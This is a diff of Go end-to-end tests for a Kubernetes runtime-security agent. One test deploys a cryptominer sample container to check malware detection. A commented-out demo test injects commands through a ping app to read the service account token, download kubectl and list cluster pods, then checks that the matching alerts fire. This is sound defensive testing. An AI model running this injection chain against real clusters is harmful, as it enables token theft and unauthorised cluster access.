@@ -9,6 +9,7 @@ import (
 	"node-agent/pkg/utils"
 	"node-agent/tests/testutils"
 	"path"
+	"slices"
 	"testing"
 	"time"
 
@@ -556,3 +557,208 @@ func Test_09_FalsePositiveTest(t *testing.T) {
 
 	assert.Equal(t, 0, len(alerts), "Expected no alerts to be generated, but got %d alerts", len(alerts))
 }
+
+func Test_10_MalwareDetectionTest(t *testing.T) {
+	start := time.Now()
+	defer tearDownTest(t, start)
+
+	t.Log("Creating namespace")
+	ns := testutils.NewRandomNamespace()
+
+	t.Log("Deploy container with malware")
+	exitCode := testutils.RunCommand("kubectl", "run", "-n", ns.Name, "malware-cryptominer", "--image=quay.io/petr_ruzicka/malware-cryptominer-container:2.0.2")
+	assert.Equalf(t, 0, exitCode, "expected no error when deploying malware container")
+
+	// Wait for pod to be ready
+	exitCode = testutils.RunCommand("kubectl", "wait", "--for=condition=Ready", "pod", "malware-cryptominer", "-n", ns.Name, "--timeout=300s")
+	assert.Equalf(t, 0, exitCode, "expected no error when waiting for pod to be ready")
+
+	// wait for application profile to be completed
+	time.Sleep(3 * time.Minute)
+
+	_, _, err := testutils.ExecIntoPod("malware-cryptominer", ns.Name, []string{"ls", "-l", "/usr/share/nginx/html/xmrig"}, "")
+	assert.NoErrorf(t, err, "expected no error when executing command in malware container")
+
+	// wait for the alerts to be generated
+	time.Sleep(20 * time.Second)
+
+	alerts, err := testutils.GetMalwareAlerts(ns.Name)
+	if err != nil {
+		t.Errorf("Error getting alerts: %v", err)
+	}
+
+	expectedMalwares := []string{
+		"Multios.Coinminer.Miner-6781728-2.UNOFFICIAL",
+	}
+
+	malwaresDetected := map[string]bool{}
+
+	for _, alert := range alerts {
+		podName, podNameOk := alert.Labels["pod_name"]
+		malewareName, malewareNameOk := alert.Labels["malware_name"]
+
+		if podNameOk && malewareNameOk {
+			if podName == "malware-cryptominer" && slices.Contains(expectedMalwares, malewareName) {
+				malwaresDetected[malewareName] = true
+			}
+		}
+	}
+
+	assert.Equal(t, len(expectedMalwares), len(malwaresDetected), "Expected %d malwares to be detected, but got %d malwares", len(expectedMalwares), len(malwaresDetected))
+}
+
+// func Test_10_DemoTest(t *testing.T) {
+// 	start := time.Now()
+// 	defer tearDownTest(t, start)
+
+// 	//testutils.IncreaseNodeAgentSniffingTime("2m")
+// 	wl, err := testutils.NewTestWorkload("default", path.Join(utils.CurrentDir(), "resources/ping-app-role.yaml"))
+// 	if err != nil {
+// 		t.Errorf("Error creating role: %v", err)
+// 	}
+
+// 	wl, err = testutils.NewTestWorkload("default", path.Join(utils.CurrentDir(), "resources/ping-app-role-binding.yaml"))
+// 	if err != nil {
+// 		t.Errorf("Error creating role binding: %v", err)
+// 	}
+
+// 	wl, err = testutils.NewTestWorkload("default", path.Join(utils.CurrentDir(), "resources/ping-app-service.yaml"))
+// 	if err != nil {
+// 		t.Errorf("Error creating service: %v", err)
+// 	}
+
+// 	wl, err = testutils.NewTestWorkload("default", path.Join(utils.CurrentDir(), "resources/ping-app.yaml"))
+// 	if err != nil {
+// 		t.Errorf("Error creating workload: %v", err)
+// 	}
+// 	assert.NoError(t, wl.WaitForReady(80))
+// 	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4"}, "")
+// 	err = wl.WaitForApplicationProfileCompletion(80)
+// 	if err != nil {
+// 		t.Errorf("Error waiting for application profile to be completed: %v", err)
+// 	}
+// 	// err = wl.WaitForNetworkNeighborhoodCompletion(80)
+// 	// if err != nil {
+// 	// 	t.Errorf("Error waiting for network neighborhood to be completed: %v", err)
+// 	// }
+
+// 	// Do an ls command using command injection in the ping command
+// 	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;ls"}, "ping-app")
+// 	if err != nil {
+// 		t.Errorf("Error executing remote command: %v", err)
+// 	}
+
+// 	// Do a cat command using command injection in the ping command
+// 	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;cat /run/secrets/kubernetes.io/serviceaccount/token"}, "ping-app")
+// 	if err != nil {
+// 		t.Errorf("Error executing remote command: %v", err)
+// 	}
+
+// 	// Do a uname command using command injection in the ping command
+// 	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;uname -m | sed 's/x86_64/amd64/g' | sed 's/aarch64/arm64/g'"}, "ping-app")
+// 	if err != nil {
+// 		t.Errorf("Error executing remote command: %v", err)
+// 	}
+
+// 	// Download kubectl
+// 	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\""}, "ping-app")
+// 	if err != nil {
+// 		t.Errorf("Error executing remote command: %v", err)
+// 	}
+
+// 	// Sleep for 10 seconds to wait for the kubectl download
+// 	time.Sleep(10 * time.Second)
+
+// 	// Make kubectl executable
+// 	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;chmod +x kubectl"}, "ping-app")
+// 	if err != nil {
+// 		t.Errorf("Error executing remote command: %v", err)
+// 	}
+
+// 	// Get the pods in the cluster
+// 	output, _, err := wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;./kubectl --server https://kubernetes.default --insecure-skip-tls-verify --token $(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods"}, "ping-app")
+// 	if err != nil {
+// 		t.Errorf("Error executing remote command: %v", err)
+// 	}
+
+// 	// Check that the output contains the pod-ping-app pod
+// 	assert.Contains(t, output, "ping-app", "Expected output to contain 'ping-app'")
+
+// 	// Get the alerts and check that the alerts are generated
+// 	alerts, err := testutils.GetAlerts(wl.Namespace)
+// 	if err != nil {
+// 		t.Errorf("Error getting alerts: %v", err)
+// 	}
+
+// 	// Validate that all alerts are signaled
+// 	expectedAlerts := map[string]bool{
+// 		"Unexpected process launched": false,
+// 		"Unexpected file access":      false,
+// 		"Kubernetes Client Executed":  false,
+// 		// "Exec from malicious source":               false,
+// 		"Exec Binary Not In Base Image":           false,
+// 		"Unexpected Service Account Token Access": false,
+// 		// "Unexpected domain request":               false,
+// 	}
+
+// 	for _, alert := range alerts {
+// 		ruleName, ruleOk := alert.Labels["rule_name"]
+// 		if ruleOk {
+// 			if _, exists := expectedAlerts[ruleName]; exists {
+// 				expectedAlerts[ruleName] = true
+// 			}
+// 		}
+// 	}
+
+// 	for ruleName, signaled := range expectedAlerts {
+// 		if !signaled {
+// 			t.Errorf("Expected alert '%s' was not signaled", ruleName)
+// 		}
+// 	}
+// }
+
+// func Test_11_DuplicationTest(t *testing.T) {
+// 	start := time.Now()
+// 	defer tearDownTest(t, start)
+
+// 	ns := testutils.NewRandomNamespace()
+// 	// wl, err := testutils.NewTestWorkload(ns.Name, path.Join(utils.CurrentDir(), "resources/deployment-multiple-containers.yaml"))
+// 	wl, err := testutils.NewTestWorkload(ns.Name, path.Join(utils.CurrentDir(), "resources/ping-app.yaml"))
+// 	if err != nil {
+// 		t.Errorf("Error creating workload: %v", err)
+// 	}
+// 	assert.NoError(t, wl.WaitForReady(80))
+
+// 	err = wl.WaitForApplicationProfileCompletion(80)
+// 	if err != nil {
+// 		t.Errorf("Error waiting for application profile to be completed: %v", err)
+// 	}
+
+// 	// process launched from nginx container
+// 	_, _, err = wl.ExecIntoPod([]string{"ls", "-a"}, "ping-app")
+// 	if err != nil {
+// 		t.Errorf("Error executing remote command: %v", err)
+// 	}
+
+// 	time.Sleep(20 * time.Second)
+
+// 	alerts, err := testutils.GetAlerts(wl.Namespace)
+// 	if err != nil {
+// 		t.Errorf("Error getting alerts: %v", err)
+// 	}
+
+// 	// Validate that unexpected process launched alert is signaled only once
+// 	count := 0
+// 	for _, alert := range alerts {
+// 		ruleName, ruleOk := alert.Labels["rule_name"]
+// 		if ruleOk {
+// 			if ruleName == "Unexpected process launched" {
+// 				count++
+// 			}
+// 		}
+// 	}
+
+// 	testutils.AssertContains(t, alerts, "Unexpected process launched", "ls", "ping-app")
+
+// 	assert.Equal(t, 1, count, "Expected 1 alert of type 'Unexpected process launched' but got %d", count)
+// }
